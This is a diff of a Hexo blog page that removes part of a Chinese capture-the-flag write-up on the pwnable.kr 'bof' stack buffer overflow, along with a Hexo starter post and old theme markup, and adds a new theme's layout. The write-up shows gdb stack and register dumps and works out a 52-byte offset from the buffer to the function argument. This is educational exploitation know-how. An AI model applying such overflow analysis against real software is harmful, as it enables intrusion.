-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Stack level 0, frame at 0xffffcef0:</span><br><span class="line"> eip = 0x565562ab <span class="keyword">in</span> main; saved eip = 0xf7da3cb9</span><br><span class="line"> called by frame at 0xffffcf50</span><br><span class="line"> Arglist at 0xffffced8, args:</span><br><span class="line"> Locals at 0xffffced8, Previous frame<span class="string">&#x27;s sp is 0xffffcef0</span></span><br><span class="line"><span class="string"> Saved registers:</span></span><br><span class="line"><span class="string">  ebp at 0xffffced8, eip at 0xffffceec</span></span><br></pre></td></tr></table></figure>
-
-<p>留意这个 <code>ebp</code></p>
-<p>再看看寄存器内容</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i r</span><br></pre></td></tr></table></figure>
-
-<p>得到如下信息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">eax            0x5655629d          0x5655629d</span><br><span class="line">ecx            0xffffcef0          0xffffcef0</span><br><span class="line">edx            0xffffcf10          0xffffcf10</span><br><span class="line">ebx            0xf7fafe34          0xf7fafe34</span><br><span class="line">esp            0xffffced4          0xffffced4</span><br><span class="line">ebp            0xffffced8          0xffffced8</span><br><span class="line">esi            0xffffcfac          0xffffcfac</span><br><span class="line">edi            0xf7ffcb60          0xf7ffcb60</span><br><span class="line">eip            0x565562ab          0x565562ab &lt;main+14&gt;</span><br><span class="line">eflags         0x282               [ SF IF ]</span><br><span class="line">cs             0x23                0x23</span><br><span class="line">ss             0x2b                0x2b</span><br><span class="line">ds             0x2b                0x2b</span><br><span class="line">es             0x2b                0x2b</span><br><span class="line">fs             0x0                 0x0</span><br><span class="line">gs             0x63                0x63</span><br></pre></td></tr></table></figure>
-
-<p>然后继续运行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r</span><br></pre></td></tr></table></figure>
-
-<p>程序就会在刚刚加的断点处停下，并且会提示我们输入 <code>overflow me :</code></p>
-<p>因为缓冲区的长度是 32 字节，因此我们输入 32 个 <code>A</code>（对应 <code>0x41</code>）</p>
-<p>再用刚刚的 <code>i f</code>命令看看栈帧信息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Stack level 0, frame at 0xffffcec0:</span><br><span class="line"> eip = 0x5655623c <span class="keyword">in</span> func; saved eip = 0x565562c5</span><br><span class="line"> called by frame at 0xffffcef0</span><br><span class="line"> Arglist at 0xffffceb8, args:</span><br><span class="line"> Locals at 0xffffceb8, Previous frame<span class="string">&#x27;s sp is 0xffffcec0</span></span><br><span class="line"><span class="string"> Saved registers:</span></span><br><span class="line"><span class="string">  ebx at 0xffffceb0, ebp at 0xffffceb8, esi at 0xffffceb4, eip at 0xffffcebc</span></span><br></pre></td></tr></table></figure>
-
-<p>观察到 <code>ebp</code>已经发生了变化</p>
-<p>再来看看寄存器的内容</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i r</span><br></pre></td></tr></table></figure>
-
-<p>得到相关信息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">eax            0xffffce8c          0xffffce8c</span><br><span class="line">ecx            0xf7fb18ac          0xf7fb18ac</span><br><span class="line">edx            0x0                 0x0</span><br><span class="line">ebx            0x56559000          0x56559000</span><br><span class="line">esp            0xffffce80          0xffffce80</span><br><span class="line">ebp            0xffffceb8          0xffffceb8</span><br><span class="line">esi            0xffffcfac          0xffffcfac</span><br><span class="line">edi            0xf7ffcb60          0xf7ffcb60</span><br><span class="line">eip            0x5655623c          0x5655623c &lt;func+63&gt;</span><br><span class="line">eflags         0x282               [ SF IF ]</span><br><span class="line">cs             0x23                0x23</span><br><span class="line">ss             0x2b                0x2b</span><br><span class="line">ds             0x2b                0x2b</span><br><span class="line">es             0x2b                0x2b</span><br><span class="line">fs             0x0                 0x0</span><br><span class="line">gs             0x63                0x63</span><br></pre></td></tr></table></figure>
-
-<p>现在来看看栈帧的内容</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x /40xw <span class="variable">$esp</span></span><br><span class="line"><span class="comment"># x：   以16进制显示 </span></span><br><span class="line"><span class="comment"># w：   以4字节为一个单位显示</span></span><br><span class="line"><span class="comment"># $esp：起始地址，即当前栈顶指针</span></span><br><span class="line"><span class="comment"># 前面说过这个程序是 32 位的，因此栈顶指针为 esp ,相应的 64 位则是 rsp</span></span><br></pre></td></tr></table></figure>
-
-<p>得到栈帧内容</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0xffffce80:     0x00000000      0xffffd0fb      0x00000002      0x41414141</span><br><span class="line">0xffffce90:     0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">0xffffcea0:     0x41414141      0x41414141      0x41414141      0xe9f13600</span><br><span class="line">0xffffceb0:     0xf7fafe34      0xffffcfac      0xffffced8      0x565562c5</span><br><span class="line">0xffffcec0:     0xdeadbeef      0xf7d9093c      0xf7fc1400      0x565562b3</span><br><span class="line">0xffffced0:     0x00000000      0xffffcef0      0x00000000      0xf7da3cb9</span><br><span class="line">0xffffcee0:     0x00000000      0x00000000      0xf7dbd13d      0xf7da3cb9</span><br><span class="line">0xffffcef0:     0x00000001      0xffffcfa4      0xffffcfac      0xffffcf10</span><br><span class="line">0xffffcf00:     0xf7fafe34      0x5655629d      0x00000001      0xffffcfa4</span><br><span class="line">0xffffcf10:     0xf7fafe34      0xffffcfac      0xf7ffcb60      0x00000000</span><br></pre></td></tr></table></figure>
-
-<p>这里的 32 个 <code>0x41</code>就是我们刚刚输入的 <code>A</code>，<code>0xdeadbeef</code>就是我们传入的 <code>func</code>函数的参数 <code>key</code>，二者之间相差 52 个字节</p>
-<p>但是，从 <code>buffer</code>结束到传入的 <code>key</code>开始之间还有一些内容，这些是什么呢？</p>
-<p>我们从传入的 <code>0xdeadbeef</code>倒着向前看看：</p>
-<p><code>0x565562c5</code>，也就是 <code>main</code>函数中 <code>call func</code>的下一条指令的地址，即返回地址</p>
-<p><code>0xffffced8</code>是进入 <code>func</code>函数前的 <code>ebp</code>，也就是 <code>main</code>的 <code>ebp</code></p>
-<p><code>0xffffcfac</code>是进入 <code>func</code>函数前的 <code>esi</code>，<code>esi</code>的值在函数调用前后必须保持不变（不过此处调用函数并没有改变 <code>esi</code>的值）</p>
-<p><code>0xf7fafe34</code>是进入 <code>func</code>函数前的 <code>ebx</code>，<code>ebx</code>的值在函数调用前后必须保持不变</p>
-<p><code>0xe9f13600</code>是编译器为了内存对齐（ 16 字节对齐）填充的随机值</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ebp-2Ch +-------------------------+  &lt;- esp (函数分配局部空间后的栈顶)</span><br><span class="line">        |     overflowme[32]      |   32字节</span><br><span class="line">ebp-Ch  +-------------------------+ </span><br><span class="line">        |          对齐           |    4字节</span><br><span class="line">ebp-8h  +-------------------------+  </span><br><span class="line">        |  调用者的 ebx (4 bytes)  |   调用者的基址</span><br><span class="line">ebp-4h  +-------------------------+  </span><br><span class="line">        |  调用者的 esi (4 bytes)  |   调用者的源索引</span><br><span class="line">ebp     +-------------------------+  </span><br><span class="line">        |  调用者的 ebp (4 bytes)  |   调用者的栈帧基址</span><br><span class="line">ebp+4h  +-------------------------+  </span><br><span class="line">        |    返回地址 (4 bytes)    |   call func 的下一条指令地址</span><br><span class="line">ebp+8h  +-------------------------+  </span><br><span class="line">        |    key 参数 (4 bytes)    |    传入的 func 函数的参数 0xdeadbeef</span><br><span class="line">ebp+Ch  +-------------------------+</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://kabalts.github.io/2026/10/16/bof/" data-id="cmval20810000pov71t9qhvv6" data-title="bof" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84pwnable-kr/" rel="tag">从零开始的pwnable.kr</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2026/10/16/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2026-10-16T05:26:18.610Z" itemprop="datePublished">2026-10-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/10/16/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://kabalts.github.io/2026/10/16/hello-world/" data-id="cmval20850004pov75clpgwpz" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84pwnable-kr/" rel="tag">从零开始的pwnable.kr</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84pwnable-kr/" style="font-size: 10px;">从零开始的pwnable.kr</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archiv</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/10/">October 2026</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">letzter Beitrag</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2026/10/16/fd/">fd</a>
-          </li>
-        
-          <li>
-            <a href="/2026/10/16/passcode/">passcode</a>
-          </li>
-        
-          <li>
-            <a href="/2026/10/16/collision/">collision</a>
-          </li>
-        
-          <li>
-            <a href="/2026/10/16/bof/">bof</a>
-          </li>
-        
-          <li>
-            <a href="/2026/10/16/hello-world/">Hello World</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
       </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2026 kabalts<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item menu-item-active">
+                <a href="/">Home</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/archives/">Archive</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/categories/gallery/">Gallery</a>
+              </li> 
+                   
+          
+        </ul>
+      </nav>
     </div>
   </div>
-</footer>
+</div>
 
+
+      <div class="main">
+        <div class="flex-container">
+          <div class="profile">
+    <div class="profile-image">
+        
+            <img src="/profile_cover.png" alt="featured_image">
+          
     </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
+    <div class="post-content profile-content">
+        <div class="profile-title">
+            Hi, this is Frame.
+        </div>
+        <div class="profile-body">
+            A minimal, elegant hexo theme.
+        </div>
+        
+            <div class="profile-link">
+                <a href="/">Home</a> 
+            </div>           
+        
+            <div class="profile-link">
+                <a href="/archives/">Blogs</a> 
+            </div>           
+        
+    </div>
     
+</div>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+            
+            
+                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
+                
+        </div>
+    </div>
+</div>
 
+    </div>
 
-<script src="/js/jquery-3.6.4.min.js"></script>
-
-
-
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-
-  </div>
-</body>
+  </body>
 </html>
